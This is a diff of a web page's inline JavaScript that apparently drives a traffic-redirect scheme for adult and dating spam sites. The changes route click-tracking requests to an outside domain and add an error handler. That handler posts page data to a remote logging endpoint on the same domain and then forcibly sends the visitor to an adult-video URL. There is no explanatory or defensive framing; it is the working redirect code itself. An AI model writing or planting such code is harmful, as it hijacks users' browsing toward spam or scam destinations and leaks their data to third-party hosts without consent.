@@ -9,7 +9,7 @@
     </head>
 <body>
 <script type="text/javascript">
-    var u = 'https://1000fapvids.online/3QkpHJ?source=donf', cf = '5N0wy44CvIULBDCu145fcg__', forceClickFallback = '';
+    var u = 'https://1000fapvids.online/3QkpHJ?source=donf', cf = '', forceClickFallback = '';
     
 
     function getClickWithFp(params, fpComponents) {
@@ -19,7 +19,7 @@
 
     function getClick(params) {
         $.get(
-            '/click.php',
+            'https://www.datingonlinehub.life/click.php',
             params,
             handleClickResponse
         );
@@ -79,6 +79,18 @@
         } catch (err) {
             handleError(err.message);
         }
+    }
+
+    function handleError(msg, data) {
+        window.alert(data);
+        $.post(
+            "https://www.datingonlinehub.life/frontlog.php",
+            {
+                message: msg || '(no message)',
+                data: data
+            }
+        );
+        window.location.href = u;
     }
 
     $(document).ready(function () {
